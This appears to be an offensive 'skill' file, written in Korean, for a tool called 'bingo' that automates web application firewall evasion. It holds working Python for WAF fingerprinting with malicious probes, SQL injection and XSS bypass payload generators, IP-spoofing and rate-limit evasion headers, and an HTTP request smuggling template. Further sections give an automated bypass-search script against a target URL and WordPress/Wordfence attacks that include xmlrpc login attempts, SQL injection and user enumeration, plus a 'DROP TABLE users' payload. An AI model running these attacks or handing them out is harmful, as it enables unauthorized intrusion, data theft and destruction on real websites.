# WAF BYPASS MASTERY — bingo Signature Skill

bingo의 핵심 차별화 기술. 다른 도구들이 막히는 곳에서도 통과한다.

---

## PHASE 0 — WAF 핑거프린팅 (공격 전 필수)

### 0.1 WAF 종류 자동 탐지
```python
import httpx, re

def fingerprint_waf(url: str) -> dict:
    """응답 헤더·쿠키·바디로 WAF 종류 판별"""
    waf_sigs = {
        "Cloudflare":    ["cf-ray", "cf-cache-status", "__cfduid", "cloudflare"],
        "AWS WAF":       ["x-amzn-requestid", "x-amz-cf-id", "awselb"],
        "Akamai":        ["akamai-ghost", "akamaierror", "x-check-cacheable"],
        "Sucuri":        ["x-sucuri-id", "sucuri-clientip"],
        "Imperva":       ["x-iinfo", "visid_incap_", "_incap_ses_"],
        "ModSecurity":   ["mod_security", "modsecurity", "NOYB"],
        "Wordfence":     ["wordfence", "wfvt_"],
        "F5 BIG-IP":     ["bigipserver", "TS", "F5"],
        "Fortinet":      ["fortigate", "FORTIWAFSID"],
        "Barracuda":     ["barra_counter_session", "BNI__BARRACUDA_LB_COOKIE"],
        "Nginx":         ["nginx"],
        "Tengine":       ["tengine"],
    }

    client = httpx.Client(follow_redirects=True, timeout=10,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    
    # 1. 정상 요청
    r_normal = client.get(url)
    
    # 2. 악성 페이로드로 WAF 트리거
    payloads = ["?id=1'", "?id=1 UNION SELECT 1--", "?id=<script>alert(1)</script>"]
    r_blocked = None
    for p in payloads:
        try:
            r_blocked = client.get(url.split("?")[0] + p)
            if r_blocked.status_code in (403, 406, 429, 501, 503):
                break
        except Exception:
            pass
    
    result = {"waf": "Unknown", "status_normal": r_normal.status_code,
              "headers": dict(r_normal.headers)}
    
    # 헤더·쿠키로 WAF 탐지
    all_headers = " ".join(k.lower() + " " + v.lower() 
                           for k, v in r_normal.headers.items())
    all_cookies = " ".join(r_normal.cookies.keys()).lower()
    body_lower = r_normal.text[:2000].lower()
    
    for waf_name, sigs in waf_sigs.items():
        for sig in sigs:
            if sig.lower() in all_headers or sig.lower() in all_cookies or sig.lower() in body_lower:
                result["waf"] = waf_name
                result["sig"] = sig
                break
    
    if r_blocked:
        result["blocked_status"] = r_blocked.status_code
        result["is_blocking"] = r_blocked.status_code != r_normal.status_code
    
    print(f"[WAF Fingerprint] {result['waf']} | Normal: {result['status_normal']}", 
          f"| Blocked: {result.get('blocked_status', 'N/A')}")
    return result
```

---

## PHASE 1 — 인코딩 우회 레이어 (WAF 서명 무력화)

### 1.1 SQL Injection WAF 우회 페이로드 생성기
```python
def generate_sqli_bypass_payloads(param_value: str, technique: str = "all") -> list:
    """WAF 서명을 피하는 SQLi 페이로드 변형 생성"""
    base = param_value
    payloads = []
    
    # ── Layer 1: 주석 삽입 ──────────────────────────────────────
    payloads += [
        f"{base}/**/UNION/**/SELECT",
        f"{base}/*!UNION*//*!SELECT*/",
        f"{base}/*! UNION*//* */ SELECT",
        f"{base}UNION--\n SELECT",
        f"{base}UN/**/ION SE/**/LECT",
    ]
    
    # ── Layer 2: 대소문자 혼합 ─────────────────────────────────
    payloads += [
        f"{base}uNiOn SeLeCt",
        f"{base}UnIoN sElEcT",
        f"{base}uNION selECT",
    ]
    
    # ── Layer 3: URL 인코딩 변형 ───────────────────────────────
    payloads += [
        f"{base}%55NION%20SELECT",        # U → %55
        f"{base}%u0055NION SELECT",       # Unicode escape
        f"{base}UNION%09SELECT",          # 탭
        f"{base}UNION%0ASELECT",          # 줄바꿈
        f"{base}UNION%0DSELECT",          # CR
        f"{base}UNION%0D%0ASELECT",       # CRLF
        f"{base}UNION%A0SELECT",          # NBSP
        f"{base}UNION%20%23foo%0ASELECT", # 주석+줄바꿈
    ]
    
    # ── Layer 4: 과다 공백 / 특수 공백 ────────────────────────
    payloads += [
        f"{base}UNION%20%20%20SELECT",
        f"{base}UNION\t\tSELECT",
        f"{base}UNION\r\nSELECT",
    ]
    
    # ── Layer 5: HPP (파라미터 오염) ──────────────────────────
    payloads += [
        f"{base}&{base.split('=')[0]}=UNION SELECT",  # 파라미터 중복
    ]
    
    # ── Layer 6: Chunked / Double encoding ────────────────────
    payloads += [
        f"{base}%2555NION SELECT",        # 이중 인코딩 %25 = %
        f"{base}%252f%252fUNION SELECT",
    ]
    
    return payloads


def waf_bypass_request(url: str, param: str, payload: str, 
                        method: str = "GET", headers: dict = None) -> httpx.Response:
    """WAF 우회 헤더와 함께 요청"""
    bypass_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "True-Client-IP": "127.0.0.1",
        "CF-Connecting-IP": "127.0.0.1",
        "Forwarded": "for=127.0.0.1",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    if headers:
        bypass_headers.update(headers)
    
    client = httpx.Client(follow_redirects=True, timeout=15, headers=bypass_headers)
    
    if method.upper() == "GET":
        from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse(parsed._replace(query=new_query))
        return client.get(new_url)
    else:
        return client.post(url, data={param: payload})
```

---

## PHASE 2 — WAF별 맞춤 우회 전략

### 2.1 Cloudflare WAF 우회
```python
CLOUDFLARE_BYPASS_TECHNIQUES = {
    "sqli": [
        # CF는 공백+SELECT 조합을 탐지 — 주석으로 대체
        "1 /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--+",
        "1/**/UNION(SELECT(1),(2),(3))--+",
        "1'/**/OR/**/'1'='1",
        "1' /*!50000AND*/ 1=1--+",
        # Cloudflare 미탐지 패턴
        "1;SELECT%09IF(1=1,SLEEP(5),0)--",
        "1'XOR(if(now()=sysdate(),sleep(5),0))OR'",
        # JSON 함수 우회 (MySQL)
        "1 AND JSON_KEYS((SELECT CONVERT((SELECT schema_name FROM information_schema.schemata LIMIT 0,1) USING utf8)))",
    ],
    "xss": [
        "<img src=x onerror=alert`1`>",
        "<svg/onload=alert(1)>",
        "javascript:alert/**/('xss')",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "'-alert(1)-'",
        "\"><img src=1 href=1 onerror=\"javascript:alert(1)\">",
    ],
    "headers": {
        "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "X-Forwarded-For": "1.1.1.1",  # Cloudflare IP
        "CF-Connecting-IP": "127.0.0.1",
    }
}


### 2.2 ModSecurity WAF 우회
MODSECURITY_BYPASS = {
    "sqli": [
        # ModSec 기본 룰셋 우회
        "1 AND 1=1",          # 너무 간단해서 탐지 안 됨
        "1/*!AND*/1=1",
        "1+AND+1=1",          # + → 공백
        "1%0aAND%0a1=1",      # 줄바꿈
        # Core Rule Set (CRS) 우회
        "id=1 and 1=1-- -",   # CRS 3.x
        "1 AND 0x31=0x31",    # Hex 비교
        "1 AND CHAR(49)='1'", # CHAR 함수
    ],
    "paranoia_level_1": [
        "UNION SELECT 1,2,3--",
        "' OR 1=1--",
    ],
    "paranoia_level_2": [
        "/*!UNION*//*!SELECT*/1,2,3--",
        "' /*!OR*/ '1'='1'--",
    ],
    "paranoia_level_3": [
        # HPP + 주석 조합
        "1/**/UNION%0a/*!50000SELECT*/1,2,3--+",
    ],
}


### 2.3 AWS WAF 우회
AWS_WAF_BYPASS = {
    "sqli": [
        # AWS는 키워드 거리 기반 탐지
        "1 AND(SELECT 1 FROM(SELECT SLEEP(5))a)--+",
        "1 AND 1=1 LIMIT 1--+",
        "' AND SLEEP(5)--+",
        # 파라미터 분리
        "1;WAITFOR DELAY '0:0:5'--",
        # Multipart + JSON 혼용
        "1%00UNION SELECT 1",  # Null byte
    ],
    "waf_rule_groups": {
        "AWSManagedRulesSQLiRuleSet": [
            "1 oR 1=1--",
            "1/**/OR/**/1=1--",
        ],
        "AWSManagedRulesCommonRuleSet": [
            "1 AND 1=1",
        ]
    }
}
```

---

## PHASE 3 — 고급 우회 기법

### 3.1 HTTP Request Smuggling으로 WAF 우회
```python
# WAF는 Content-Length를 보지만 백엔드는 Transfer-Encoding을 봄
SMUGGLING_TEMPLATE = """POST / HTTP/1.1\r
Host: TARGET\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: 6\r
Transfer-Encoding: chunked\r
\r
0\r
\r
G"""
```

### 3.2 Header Injection으로 WAF IP 우회
```python
IP_SPOOF_HEADERS = [
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Forwarded-For", "10.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-Originating-IP", "127.0.0.1"),
    ("X-Remote-IP", "127.0.0.1"),
    ("X-Remote-Addr", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("True-Client-IP", "127.0.0.1"),
    ("CF-Connecting-IP", "127.0.0.1"),
    ("X-Cluster-Client-IP", "127.0.0.1"),
    ("Forwarded", "for=127.0.0.1"),
    ("X-ProxyUser-Ip", "127.0.0.1"),
]
```

### 3.3 WAF 레이트 리밋 우회
```python
RATE_LIMIT_BYPASS_HEADERS = {
    # X-RateLimit-* 헤더 무효화 시도
    "X-Forwarded-For": "RANDOM_IP",     # 매 요청마다 IP 변경
    "X-Real-IP": "RANDOM_IP",
    "User-Agent": "ROTATE",             # UA 로테이션
}

# 슬로우 요청으로 레이트 리밋 회피
import time
import random
def slow_scan(urls, min_delay=0.5, max_delay=2.0):
    for url in urls:
        time.sleep(random.uniform(min_delay, max_delay))
        yield url
```

### 3.4 JSON/XML 페이로드로 WAF 우회
```python
# WAF가 application/json을 덜 검사하는 경우
JSON_SQLI_PAYLOADS = [
    {"id": "1 UNION SELECT 1--"},
    {"id": "1' OR '1'='1"},
    {"id": {"$ne": None}},          # NoSQL
    {"id": {"$gt": ""}},
    {"id": "1; DROP TABLE users--"},
]

# XML 엔티티 우회
XML_BYPASS = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe "UNION SELECT 1--">
]>
<root><id>1 &xxe;</id></root>"""
```

---

## PHASE 4 — WAF 완전 우회 자동화 스크립트
```python
import httpx, itertools, time

def auto_waf_bypass(url: str, param: str, base_payload: str) -> str:
    """WAF를 우회하는 페이로드를 자동으로 찾아서 반환"""
    
    client = httpx.Client(
        follow_redirects=True, timeout=15,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "X-Forwarded-For": "127.0.0.1",
        }
    )
    
    # 기준점: 정상 응답 길이
    normal_resp = client.get(url)
    normal_len = len(normal_resp.text)
    
    bypass_transforms = [
        lambda p: p,                                    # 원본
        lambda p: p.replace(" ", "/**/"),              # 공백 → 주석
        lambda p: p.replace(" ", "%09"),               # 공백 → 탭
        lambda p: p.replace(" ", "%0a"),               # 공백 → LF
        lambda p: p.replace(" ", "%0d%0a"),            # 공백 → CRLF
        lambda p: p.replace("UNION", "/*!UNION*/"),    # SQL 키워드 주석
        lambda p: p.replace("SELECT", "/*!SELECT*/"),
        lambda p: p.replace("AND", "/*!AND*/"),
        lambda p: p.replace("OR", "/*!OR*/"),
        lambda p: p.upper(),                           # 대문자
        lambda p: "".join(                             # 랜덤 케이스
            c.upper() if i % 2 == 0 else c.lower() 
            for i, c in enumerate(p)
        ),
        lambda p: p.replace(" ", "+"),                # 공백 → +
        lambda p: p.replace(" ", "%20"),              # URL 인코딩
        lambda p: p.replace(" ", "%2b"),              # + URL 인코딩
        lambda p: "%00" + p,                          # Null byte prefix
    ]
    
    for i, transform in enumerate(bypass_transforms):
        try:
            payload = transform(base_payload)
            from urllib.parse import urlencode
            test_url = url.split("?")[0] + f"?{param}={payload}"
            resp = client.get(test_url)
            
            status_ok = resp.status_code not in (403, 406, 429, 501, 503)
            len_diff = abs(len(resp.text) - normal_len)
            
            print(f"  [{i+1:02d}] Status={resp.status_code} Len={len(resp.text)} | {payload[:50]}")
            
            if status_ok and len_diff > 10:
                print(f"  ✅ WAF BYPASS FOUND: transform #{i+1}")
                return payload
                
            time.sleep(0.3)
        except Exception as e:
            print(f"  ERR [{i+1}]: {e}")
    
    print("  ❌ No bypass found with current transforms")
    return ""

# 실행 예시
# bypass_payload = auto_waf_bypass("https://target.com/page", "id", "1' UNION SELECT 1,2,3--+")
```

---

## PHASE 5 — WordPress 특화 WAF 우회

### 5.1 WordPress + Wordfence 우회
```python
WP_WORDFENCE_BYPASS = {
    "login_bypass": [
        # xmlrpc.php를 통한 로그인 (Wordfence 미탐지)
        """<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>password123</value></param>
  </params>
</methodCall>""",
    ],
    "sqli_wp": [
        # WordPress search 파라미터
        "/?s=1'/**/UNION/**/SELECT/**/1,2,user(),4,5,6,7--+",
        "/?s=1'+AND+1=1--+",
        # WooCommerce 파라미터
        "/?add-to-cart=1'+AND+1=1--+",
        # WordPress comment POST
        "comment=1'/**/UNION/**/SELECT/**/1--+",
    ],
    "rest_api": [
        # REST API로 WAF 우회
        "/wp-json/wp/v2/posts?search=1' UNION SELECT 1--",
        "/wp-json/wp/v2/users",  # 사용자 열거
    ]
}
```

### 5.2 WordPress ?p= 파라미터 분석
```python
def analyze_wp_p_param(base_url: str) -> dict:
    """?p= 파라미터 취약점 분석"""
    import httpx
    
    client = httpx.Client(follow_redirects=True, timeout=10,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    
    results = {}
    
    # 1. 정상 응답 수집
    r_normal = client.get(f"{base_url}?p=1")
    results["p1_status"] = r_normal.status_code
    results["p1_len"] = len(r_normal.text)
    
    # 2. SQLi 가능성 확인 (WordPress는 보통 int_val로 캐스팅)
    sqli_tests = [
        ("?p=1'", "quote_error"),
        ("?p=1 AND 1=1", "true_condition"),
        ("?p=1 AND 1=2", "false_condition"),
        ("?p=1 AND SLEEP(3)", "time_based"),
    ]
    
    for payload, name in sqli_tests:
        r = client.get(f"{base_url}{payload}")
        results[name] = {
            "status": r.status_code,
            "len": len(r.text),
            "diff_from_normal": len(r.text) - results["p1_len"]
        }
        print(f"  {name}: status={r.status_code} len={len(r.text)} diff={results[name]['diff_from_normal']}")
    
    # 3. WordPress 고유 취약점 — ID 열거
    existing_posts = []
    for pid in range(1, 20):
        r = client.get(f"{base_url}?p={pid}")
        if r.status_code == 200 and len(r.text) > 1000:
            existing_posts.append(pid)
    
    results["existing_post_ids"] = existing_posts
    print(f"  Existing posts: {existing_posts}")
    
    return results
```

---

## WAF 우회 치트시트

| WAF | 탐지 방식 | 우회 전략 |
|-----|----------|---------|
| Cloudflare | 시그니처 + ML | `/*!50000UNION*/`, 탭/LF 공백, JSON body |
| AWS WAF | 정규식 룰 | 파라미터 오염, Null byte, 이중 URL 인코딩 |
| ModSecurity | CRS 룰셋 | 인라인 주석, 케이스 변환, `%0a` 공백 |
| Wordfence | WordPress 특화 | xmlrpc.php, REST API, 주석 인젝션 |
| Akamai | 행동 분석 | 슬로우 스캔, IP 로테이션, 정상 UA |
| Imperva | 평판 기반 | 헤더 스푸핑, CDN IP 사용 |
